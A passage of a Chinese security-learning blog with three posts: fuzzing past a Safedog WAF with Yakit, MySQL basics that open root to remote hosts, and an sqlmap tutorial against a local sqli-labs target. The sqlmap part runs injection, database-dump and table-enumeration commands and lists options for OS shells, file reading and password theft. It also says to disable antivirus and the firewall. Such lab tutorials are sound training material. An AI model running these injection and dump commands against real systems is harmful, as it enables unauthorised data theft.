<p>\2. 打开Yakit软件，把第一关链接192.168.2.2&#x2F;sqli&#x2F;Less&#x2F;?id&#x3D;1复制到Yakit内置浏览器，然后抓包。</p>
<p>\3. 点击Fuzz，然后在下图位置插入字典。</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080952862.png" alt="image-20240108095218542"></p>
<p>\4. 字典中添加如下内容</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080953095.png" alt="image-20240108095327527"></p>
<p> 点击发送请求，1,2行数据报错，原因是字典中的空格没有编码。</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080953771.png" alt="image-20240108095346580"></p>
<p>给空格编码%20后，1，2行数据没有报错了。响应大小为5276说明被安全狗拦截了。4~8整个过程被称为模糊测试。</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080954177.png" alt="image-20240108095407195"></p>
<p>.在12345处插入6位验证码</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080954037.png" alt="image-20240108095423152"></p>
<p> 得到我们需要的payloads</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080954573.png" alt="image-20240108095439553"></p>
<p>9.使用正确的payloads成功绕过waf</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080954730.png" alt="image-20240108095457572"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/%E5%AE%89%E5%85%A8%E7%8B%97-waf%E7%BB%95%E8%BF%87/" data-id="clr4slxwg000mqofngse7e9r6" data-title="安全狗-waf绕过" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-SQL语句和SQLMAP语句" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/08/SQL%E8%AF%AD%E5%8F%A5%E5%92%8CSQLMAP%E8%AF%AD%E5%8F%A5/" class="article-date">
  <time class="dt-published" datetime="2024-01-08T01:13:33.000Z" itemprop="datePublished">2024-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/08/SQL%E8%AF%AD%E5%8F%A5%E5%92%8CSQLMAP%E8%AF%AD%E5%8F%A5/">SQL语句和SQLMAP语句</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="SQL语句和SQLMAP语句"><a href="#SQL语句和SQLMAP语句" class="headerlink" title="SQL语句和SQLMAP语句"></a>SQL语句和SQLMAP语句</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h3 id="进入MySQL："><a href="#进入MySQL：" class="headerlink" title="进入MySQL："></a>进入MySQL：</h3><p>进入MySQL的根目录下的bin目录(……..\MySQL5.7.26\bin)，再在上面栏中输入cmd,点击Ente进入该目录下的命令行窗口</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080919667.png" alt="image-20240108091940180"></p>
<p>或者选择直接打开命令行窗口cd到……..\MySQL5.7.26\bin目录下</p>
<p>再在该窗口中输入，</p>
<p>mysql -u root -p #-u用于指定登录MySQL服务器的用户名。-p: 用于指定登录MySQL服务器的密码。</p>
<p>进入root用户的登陆界面</p>
<p>输入密码，直接Enter登陆，请记住MySQL密码，密码忘记了在找回密码很麻烦很麻烦！且MySQL卸载容易残留内容。</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080925395.png" alt="image-20240108092501972"></p>
<p>后续mysql数据库需要使用到远程操控（虚拟机之类）</p>
<h3 id="解除远程限制"><a href="#解除远程限制" class="headerlink" title="解除远程限制"></a>解除远程限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use mysql; # 使用mysql这个数据库</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;; # 更新&quot;user&quot;表中&quot;User&quot;列为&#x27;root&#x27;的行，将相应行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush privileges; #重新加载授权表，使对用户权限的更改立即生效</span><br></pre></td></tr></table></figure>

<p>use xxxx; 选择数据库,后续SQL操作将在xxx数据库中进行,它不会真正“使用”某个数据库,而是选择操作对象为某个数据库。</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080927279.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080927597.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080927548.png" alt="img"></p>
<p>然后就可以通过MySQL辅助软件从物理机连接虚拟机了，查询好虚拟机ip</p>
<h3 id="MySQL数据库操作"><a href="#MySQL数据库操作" class="headerlink" title="MySQL数据库操作"></a>MySQL数据库操作</h3><p>MySQL名字要求：可以使用字母、数字和下划线，必须以字母开头，长度不能超过64个字符，MySQL对于英语大小写很敏感，取名尽量要有意义，避免使用MySQL保留字命名如SELECT、INSERT、UPDATE、DELETE等</p>
<p>展示已有数据库</p>
<p>show databases;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080928360.png" alt="img"></p>
<p>创建数据库</p>
<p>create database database_name;create database test;<br>创建数据库database_name;创建数据库测试;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080928197.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080929868.png" alt="img"></p>
<p>删除数据库</p>
<p>drop database database_name;drop database test;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080929945.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080930416.png" alt="image-20240108093028969"></p>
<p>选择&#x2F;使用数据库</p>
<p>use database_name;use security;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080931372.png" alt="image-20240108093100098"></p>
<p>显示库表</p>
<p>show tables;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080931611.png" alt="image-20240108093126877"></p>
<h3 id="MySQL表操作"><a href="#MySQL表操作" class="headerlink" title="MySQL表操作"></a>MySQL表操作</h3><p>创建表</p>
<p>create table table_name(列名 类型(长度要求),列名 类型(长度要求),……);create table student(id int,name char(10),age int,sex char(5)); </p>
<p>查看表结构</p>
<p>desc table_name;desc student;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080932844.png" alt="image-20240108093205362"></p>
<p>删除表</p>
<p>drop table table_name;drop table student;</p>
<p>表添加列</p>
<p>alter table table_name add 列名 类型(*);alter table student add height int(10);</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080932435.png" alt="image-20240108093228319"></p>
<p>表删除列</p>
<p>alter table table_name drop 列名;alter table student drop height;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080933255.png" alt="image-20240108093327936"></p>
<p>列改名</p>
<p>alter table 表名 change column 被改列名 要改成的名字 类型;alter table student change column height high int(3);</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080933877.png" alt="image-20240108093357031"></p>
<p>列更改数据类型</p>
<p>alter table 表名 modify column 要改的列名 数据类型alter table student modify column high char(10);</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080934629.png" alt="image-20240108093418422"></p>
<p>修改表名</p>
<p>alter table 前表名 rename to 要改成的表名;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table student rename to student_table1;</span><br><span class="line">将 Worker E 重命名为 student_table1;</span><br><span class="line">show tables; 显示表格;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080934151.png" alt="image-20240108093445933"></p>
<h3 id="MySQL数据操作"><a href="#MySQL数据操作" class="headerlink" title="MySQL数据操作"></a>MySQL数据操作</h3><p>增加&#x2F;插入数据</p>
<p>insert into u’s表名 (列名1,列名,列名1,…) value (数据,数据,数据,数据,…);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 insert into student_table(id,name,age,sex,high) value (001,&quot;张三&quot;,10,&quot;男&quot;,160);</span><br><span class="line">2 insert into student_table(id,name,age,sex,high) value (002,&quot;丽丽&quot;,12,&quot;女&quot;,140);</span><br><span class="line">3 select * from student_table;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080936706.png" alt="image-20240108093532729"></p>
<p>删除数据项</p>
<p>delete from 表名 where 列名&#x3D;条件; delete from student_table where high&#x3D;140;</p>
<p>更新数据项</p>
<p>update 表名 set 列名&#x3D;数据 where 条件;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update student_table  set age=12;</span><br><span class="line">update student_table set age=12 where name=&#x27;张三&#x27;;</span><br><span class="line">select * from student_table;</span><br></pre></td></tr></table></figure>

<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ol>
<li>between最小值 and 最大值</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create table stu(id int,name char(10),age int,sex char(5),high int(3));</span><br><span class="line">insert into stu(id,name,age,sex,high) value (001,&quot;张三&quot;,10,&quot;男&quot;,160);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (002,&quot;丽丽&quot;,12,&quot;女&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (003,&quot;王五&quot;,11,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (004,&quot;李四&quot;,12,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (005,&quot;王伟&quot;,11,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (006,&quot;华子&quot;,12,&quot;男&quot;,140);</span><br></pre></td></tr></table></figure>

<p>select * from 表名 where 列名 between 最小值 and 最大值；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from stu where id between 2 and 4;</span><br><span class="line">select * from stu where id&gt;=2 and id&lt;=4;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080938203.png" alt="image-20240108093845015"></p>
<p>空值 null</p>
<p>select * from 表名 where 列名 is null；（判断这一列有空值）select * from stu where high is null;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080939366.png" alt="image-20240108093909306"></p>
<p>in(额外取值)</p>
<p>语法：select * from 表名 where 列名 in （值1，值2，…）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from stu where age in(10,11,9);</span><br><span class="line">select * from stu where age in(10,11);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080939893.png" alt="image-20240108093928668"></p>
<p>like 好像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">% 代表任意字符 ,_一个下划线代替一个字符</span><br><span class="line">select * from 表名 where 列名 like ‘通配符 特征 通配符’；</span><br><span class="line">select * from stu where name like &#x27;王_&#x27;;</span><br><span class="line">insert into stu(id,name,age,sex,high) value (009,&quot;王八蛋&quot;,11,&quot;男&quot;,140);</span><br><span class="line">select * from stu where name like &#x27;王%&#x27;;</span><br></pre></td></tr></table></figure>

<p>as 为表名称或者列名称指定别名</p>
<p>select name as mz from stu where name like ‘王_’;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080940996.png" alt="image-20240108094000633"></p>
<p>union合并两个或多个select语句结果集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from stu;</span><br><span class="line">select id from stu as st where st.name like &#x27;张_&#x27; union select name from stu where age=9;</span><br><span class="line"></span><br><span class="line">select id from stu as st where st.name like &#x27;张_&#x27; union select name from stu where high=140;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080940158.png" alt="image-20240108094027908"></p>
<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>order by</p>
<p>规则：升序排序 asc （默认可省略） 降序排序 desc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单列 select * from 表名 order by 列名 asc或者 desc；</span><br><span class="line">多列 select * from 表名 order by 列名 asc或者 desc，列名2 asc或者desc，…;</span><br><span class="line">select * from stu order by age;</span><br><span class="line">select * from stu order by age desc;</span><br><span class="line">select * from stu order by age asc,id desc;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080940252.png" alt="image-20240108094054010"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080941471.png" alt="image-20240108094117166"></p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080941226.png" alt="image-20240108094130958"></p>
<h3 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h3><p>GROUP BY 和 DISTINCT 都是用于从数据库中选择唯一值的 SQL 子句</p>
<p>select distinct age from stu;</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080941229.png" alt="image-20240108094156151"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select age,count(*) from stu group by age;</span><br><span class="line">select age from stu group by age;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202401080942937.png" alt="image-20240108094233528"></p>
<p>GROUP BY 语句用于将数据按照一个或多个列进行分组，然后对每个组应用一个聚合函数以得到每个组的统计结果。GROUP BY 通常用于在查询中生成汇总信息。</p>
<p>DISTINCT 语句用于从查询结果中选择唯一的值。它可以用于从一个或多个列中选择唯一的值，也可以用于选择整行的唯一值。</p>
<h3 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h3><p>语法：</p>
<p>select 统计函数（列名），统计函数（列名2）… from 表名;</p>
<p>count：计算指定列或表达式的行数，可以用于统计记录数量。</p>
<p>SELECT COUNT(<em>) FROM table_name; 将返回表中的记录数。select id,count(</em>) from stu group by id;</p>
<p>sum：计算指定列或表达式的总和。</p>
<p>SELECT SUM(salary) FROM employees; 将返回 employees 表中 salary 列的总和。select sum(high) from stu;</p>
<p>avg：计算指定列或表达式的平均值。</p>
<p>SELECT AVG(age) FROM students; 将返回 students 表中 age 列的平均值。 select avg(high) from stu;</p>
<p>max：返回指定列或表达式的最大值。</p>
<p>SELECT MAX(price) FROM products; 将返回 products 表中 price 列的最大值。select max(id) from stu;</p>
<p>MIN：返回指定列或表达式的最小值。</p>
<p>SELECT MIN(quantity) FROM inventory; 将返回 inventory 表中 quantity 列的最小值。select min(id) from stu;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/SQL%E8%AF%AD%E5%8F%A5%E5%92%8CSQLMAP%E8%AF%AD%E5%8F%A5/" data-id="clr4slxw70003qofn41l9aiya" data-title="SQL语句和SQLMAP语句" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-sqlmap使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/24/sqlmap%E4%BD%BF%E7%94%A8/" class="article-date">
  <time class="dt-published" datetime="2023-12-24T02:18:52.000Z" itemprop="datePublished">2023-12-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/24/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap是一个开源的自动化SQL注入工具，用于检测和利用Web应用程序中的SQL注入漏洞。它能够自动检测</p>
<p>和利用SQL注入漏洞，获取数据库中的数据，以及执行数据库管理系统的操作。sqlmap支持多种数据库管理系</p>
<p>统，包括MySQL、Oracle、PostgreSQL等。虽然sqlmap在合法的渗透测试和安全审计中是一种有用的工具，</p>
<p>但在未经授权的情况下使用它是非法和违法的。因此，使用sqlmap时必须要遵守相关法律法规。</p>
<h3 id="sqlmap使用-1"><a href="#sqlmap使用-1" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><p>首先关闭杀毒软件与防火墙</p>
<p>主要是s</p>
<p>在文件sqlmap-1.7的根目录下打开cmd终端</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241028586.png" alt="image-20231224102820150"></p>
<p>cmd终端输入</p>
<p>“dir”是一个用于显示目录内容的命令，会列出当前目录中的文件和子目录。您可以看到每个文件或目录的名称、大小修改日期等信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241029007.png" alt="image-20231224102920879"></p>
<p>找到sqlmap.py</p>
<p>调用Python解释器来执行名为<code>sqlmap.py</code>的Python脚本，并将<code>-h</code>作为参数传递给该脚本</p>
<p>执行<code>python sqlmap.py -h</code>命令后，<code>sqlmap.py</code>脚本将打印出关于该工具的帮助信息，包括命令行选项、用法示例、参数说明等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241029332.png" alt="image-20231224102950222"></p>
<p>可以查看命令的使用方法</p>
<p>调用Python解释器来执行名为<code>sqlmap.py</code>的Python脚本，并将<code>-u &quot;http://192.168.2.4/sqli/Less-1/?id=1&quot;</code>作为参数传递给该脚本</p>
<p>执行后，<code>sqlmap.py</code>将开始尝试检测和利用目标URL上的SQL注入漏洞，并尝试获取数据库的名称。它会输出关于进程的信息以及找到的数据库名称，供进一步的渗透测试或漏洞利用使用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.2.4/sqli/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241030404.png" alt="image-20231224103021172"></p>
<p>此次错误是因为没有关闭病毒防护的实时保护</p>
<p>关闭后</p>
<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241030720.png" alt="image-20231224103051497"></p>
<p>输入后会有三个问题</p>
<p>1这个看起来后端数据库管理系统是MySQL，你想要跳过特定于其他DBMS的测试负载吗</p>
<p>选择y是</p>
<p>2对于剩下的测试，是否要包括所有针对“MySQL”扩展的测试，提供的水平(1)和风险(1)值</p>
<p>选择是y</p>
<p>3得到的参数很脆弱，你想继续测试其他的(如果有的话)吗?</p>
<p>选择是y</p>
<ul>
<li><code>http://192.168.2.4/sqli/Less-1/?id=1</code>是一个示例目标URL</li>
<li><code>--batch</code>：指定以批处理模式运行，即在不进行人工交互的情况下自动执行所有操作。</li>
<li><code>-D security</code>：指定要操作的数据库名称，这里设置为”security”。</li>
<li><code>--tables</code>：指定要获取指定数据库中的表的列表。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.2.4/sqli/Less-1/?id=1&quot;  --batch -D security --tables</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241031895.png" alt="image-20231224103123864"></p>
<ul>
<li><code>--batch</code>：指定以批处理模式运行，即在不进行人工交互的情况下自动执行所有操作。</li>
<li><code>-D security</code>：指定要操作的数据库名称，这里设置为”security”。</li>
<li><code>-T users</code>：指定要操作的表名，这里设置为”users”。</li>
<li><code>-C &quot;id,username&quot;</code>：指定要导出的列名，这里设置为”id”和”username”。</li>
<li><code>--dump</code>：指定导出数据的操作，将导出指定表中指定列的数据。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.2.4/sqli/Less-1/?id=1&quot; --batch -D security -T users -C &quot;id,username&quot; </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312241031350.png" alt="image-20231224103153982"></p>
<h4 id="sqlmap参数："><a href="#sqlmap参数：" class="headerlink" title="sqlmap参数："></a>sqlmap参数：</h4><p>可以通过运行<code>sqlmap --help</code>命令来获取更详细的信息，其中包含了所有可用的参数和选项</p>
<ul>
<li><code>-u</code>：指定目标URL进行注入测试。</li>
<li><code>-r</code>：指定包含HTTP请求的文件进行注入测试。</li>
<li><code>--data</code>：指定POST请求的数据进行注入测试。</li>
<li><code>-p</code>：指定要测试的参数名。</li>
<li><code>--cookie</code>：设置Cookie参数。</li>
<li><code>--level</code>：指定注入的难度级别，从1到5。</li>
<li><code>--risk</code>：指定注入的风险级别，从1到3。</li>
<li><code>--threads</code>：设置并发线程数。</li>
<li><code>--random-agent</code>：使用随机的User-Agent头。</li>
<li><code>--proxy</code>：设置HTTP代理。</li>
<li><code>--dbms</code>：指定目标数据库管理系统。</li>
<li><code>--os</code>：指定目标操作系统。</li>
<li><code>--tamper</code>：指定自定义的数据篡改脚本。</li>
<li><code>--tables</code>：列出目标数据库中的所有表。</li>
<li><code>--columns</code>：列出指定表中的所有列。</li>
<li><code>--dump</code>：导出指定表中的数据。</li>
<li><code>--dump-all</code>：导出目标数据库中的所有数据。</li>
<li><code>--dbms</code>：指定目标数据库管理系统，如MySQL、Oracle、SQL Server等。</li>
<li><code>--os</code>：指定目标操作系统，如Windows、Linux等。</li>
<li><code>--technique</code>：指定注入测试的技术，如基于错误的注入、联合查询注入等。</li>
<li><code>--time-sec</code>：指定基于时间的盲注的延迟时间。</li>
<li><code>--batch</code>：使用批量模式，自动选择所有可用选项。</li>
<li><code>--smart</code>：智能检测注入漏洞并测试。</li>
<li><code>--skip-urlencode</code>：跳过URL编码的注入测试。</li>
<li><code>--tamper</code>：使用自定义的数据篡改脚本进行注入测试。</li>
<li><code>--dns-domain</code>：执行DNS域名解析。</li>
<li><code>--dns-server</code>：指定自定义的DNS服务器。</li>
<li><code>--dns-ip</code>：指定自定义的DNS服务器IP地址。</li>
<li><code>--common-tables</code>：列出常见的系统表。</li>
<li><code>--common-columns</code>：列出常见的系统列。</li>
<li><code>--privileges</code>：列出当前用户的权限。</li>
<li><code>--users</code>：列出目标数据库中的用户。</li>
<li><code>--passwords</code>：尝试获取目标数据库中的用户密码。</li>
<li><code>--file-read</code>：读取目标服务器上的文件。</li>
<li><code>--file-write</code>：在目标服务器上写入文件。</li>
<li><code>--os-cmd</code>：执行操作系统命令。</li>
<li><code>--os-shell</code>：在目标服务器上打开命令行Shell。</li>
<li><code>--sql-shell</code>：在目标服务器上打开SQL交互Shell。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/12/24/sqlmap%E4%BD%BF%E7%94%A8/" data-id="clr4slxwc000eqofn51md2zev" data-title="sqlmap使用" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/01/08/test-my-site/">test_my_site</a>
          </li>
        
          <li>
            <a href="/2024/01/08/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/">Linux目录结构</a>
          </li>
        
          <li>
            <a href="/2024/01/08/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">网络基础知识</a>
          </li>
        
          <li>
            <a href="/2024/01/08/box%E9%9D%B6%E6%9C%BA/">box靶机</a>
          </li>
        
          <li>
            <a href="/2024/01/08/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">逻辑漏洞之支付漏洞详解</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>